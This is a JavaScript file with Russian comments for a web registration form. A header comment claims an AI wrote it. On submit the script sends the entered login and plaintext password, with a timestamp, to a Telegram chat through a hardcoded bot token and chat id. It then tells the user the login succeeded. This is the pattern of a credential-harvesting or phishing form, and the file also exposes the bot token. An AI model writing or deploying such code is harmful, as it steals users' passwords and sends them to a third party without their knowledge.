// КОД ПИСАЛ ИИ, Я ЛИШЬ НЕМНОГО ПОМОГАЛ, ТАК КАК Я ПЛОХО ЗНАЮ БЕКЕНД!

const form = document.getElementById('regForm');
const errorSpan = document.getElementById('errorModal');

if(form) {
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const login = document.getElementById('login').value;
        const pass = document.getElementById('pass').value;
        
        // Проверка валидности
        if(login == "" || pass == "") {
            errorSpan.innerHTML = "заполните все поля!";
            return;
        }
        else if(login.length <= 4 || pass.length <= 4) {
            errorSpan.innerHTML = "введите более длинные логин или пароль!";
            return;
        }
        else if(pass.includes("&")) {
            errorSpan.innerHTML = "некорректный пароль!";
            return;
        }
        else if(pass.includes("%")) {
            errorSpan.innerHTML = "некорректный пароль!";
            return;
        }
        errorSpan.innerHTML = "";
        modalBtnReg.innerHTML = 'Отправка данных';
        
        const token = "8512850162:AAGjjp6KOfuUYZsMw-ZyWr6xIHUa0s2IH50";
        const chat_id = "6727914616";
        const message = `🆕 НОВАЯ РЕГИСТРАЦИЯ
         ──────────────
        🥕Логин: ${login}
        🍔Пароль: ${pass}
        🍟Время: ${new Date().toLocaleString()}
        ──────────────`;
        const url = `https://api.telegram.org/bot${token}/sendMessage`;
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chat_id,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const data = await response.json();
            
            if(data.ok) {
                modalBtnReg.innerHTML = '✅ успешный вход!';
                document.getElementById('login').value = '';
                document.getElementById('pass').value = '';
                
                // Закрываем модалку через 1.5 секунды
                setTimeout(() => {
                    modal.classList.remove('active');
                    modalBtnReg.innerHTML = 'Зарегистрироваться';
                }, 1500);
            } else {
                errorSpan.innerHTML = 'Ошибка отправки';
                modalBtnReg.innerHTML = 'Зарегистрироваться';
            }
        } catch(error) {
            console.error('Ошибка:', error);
            errorSpan.innerHTML = 'Ошибка соединения';
            modalBtnReg.innerHTML = 'Зарегистрироваться';
        }
    });
}